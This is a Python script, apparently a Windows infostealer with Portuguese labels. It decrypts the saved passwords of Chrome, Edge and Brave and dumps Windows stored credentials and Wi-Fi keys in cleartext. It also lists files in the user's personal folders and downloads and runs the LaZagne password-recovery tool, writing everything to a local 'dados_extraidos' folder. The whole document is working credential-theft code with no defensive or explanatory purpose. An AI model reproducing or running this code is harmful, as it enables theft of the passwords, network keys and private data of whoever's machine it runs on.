import os, json, base64, shutil, sqlite3, subprocess
from pathlib import Path
from Cryptodome.Cipher import AES
import win32crypt
def get_key(browser): 
    local_state_paths = {
        "Chrome": os.getenv("LOCALAPPDATA") + r"\Google\Chrome\User Data\Local State",
        "Edge": os.getenv("LOCALAPPDATA") + r"\Microsoft\Edge\User Data\Local State",
        "Brave": os.getenv("LOCALAPPDATA") + r"\BraveSoftware\Brave-Browser\User Data\Local State",
        "Opera": os.getenv("APPDATA") + r"\Opera Software\Opera Stable\Local State"
    }
    path = local_state_paths.get(browser)
    if not path or not os.path.exists(path): return None
    with open(path, "r", encoding="utf-8") as f:
        key = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
def decrypt(buff, key): 
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()
    except:
        try: return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode()
        except: return "Erro"
def extrair_senhas(browser, db_path, out_file): 
    key = get_key(browser)
    if not key or not os.path.exists(db_path): return
    shutil.copy2(db_path, "temp.db")
    conn = sqlite3.connect("temp.db")
    cur = conn.cursor()
    cur.execute("SELECT origin_url, username_value, password_value FROM logins")
    with open(out_file, "a", encoding="utf-8") as f:
        for row in cur.fetchall():
            f.write(f"Site: {row[0]}\nUser: {row[1]}\nSenha: {decrypt(row[2], key)}\n\n")
    conn.close(); os.remove("temp.db")
def credenciais(): 
    out = subprocess.check_output("cmdkey /list", shell=True, text=True)
    with open("dados_extraidos\\credenciais_pc.txt", "w", encoding="utf-8") as f: f.write(out)
def wifi(): 
    output = subprocess.check_output("netsh wlan show profiles", shell=True, text=True)
    redes = [i.split(":")[1].strip() for i in output.splitlines() if "Todos os Perfis" in i]
    with open("dados_extraidos\\senhas_wifi.txt", "w", encoding="utf-8") as f:
        for r in redes:
            res = subprocess.run(f'netsh wlan show profile name="{r}" key=clear', shell=True, capture_output=True, text=True)
            f.write(f"\n===== {r} =====\n{res.stdout}\n")
def arquivos(): 
    locais = [Path.home() / "Desktop", Path.home() / "Documents", Path.home() / "Downloads"]
    with open("dados_extraidos\\arquivos_pessoais.txt", "w", encoding="utf-8") as f:
        for local in locais:
            for path in local.rglob("*"):
                if path.is_file(): f.write(str(path) + "\n")
def executar_lazagne():
    if not os.path.exists("LaZagne.exe"):
        print("Baixando LaZagne...")
        url = "https://github.com/AlessandroZ/LaZagne/releases/download/2.4/LaZagne.exe"
        subprocess.run(f"curl -L -o LaZagne.exe {url}", shell=True)
    subprocess.run("LaZagne.exe all", shell=True, stdout=open("dados_extraidos\\resultados_lazagne.txt", "w"))
os.makedirs("dados_extraidos", exist_ok=True)
extrair_senhas("Chrome", os.getenv("LOCALAPPDATA") + r"\Google\Chrome\User Data\Default\Login Data", "dados_extraidos\\senhas_chrome.txt")
extrair_senhas("Edge", os.getenv("LOCALAPPDATA") + r"\Microsoft\Edge\User Data\Default\Login Data", "dados_extraidos\\senhas_edge.txt")
extrair_senhas("Brave", os.getenv("LOCALAPPDATA") + r"\BraveSoftware\Brave-Browser\User Data\Default\Login Data", "dados_extraidos\\senhas_brave.txt")
credenciais()
wifi()
arquivos()
executar_lazagne()
print("✅ Tudo finalizado. Resultados em 'dados_extraidos'")
